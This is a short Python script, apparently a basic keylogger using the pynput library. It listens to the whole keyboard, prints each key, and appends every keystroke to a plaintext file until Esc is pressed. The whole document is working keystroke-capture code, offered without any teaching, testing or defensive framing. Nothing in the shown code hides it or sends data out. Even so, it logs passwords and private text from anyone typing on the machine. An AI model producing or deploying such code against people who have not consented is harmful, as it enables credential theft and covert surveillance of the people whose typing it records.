import pynput
from pynput.keyboard import Listener, Key


def write(key):
    with open("keys.txt", "a") as f:
        f.write(f"{str(key)}\n")


def press(key):
    print(f"{key} pressed")
    write(key)


def release(key):
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()
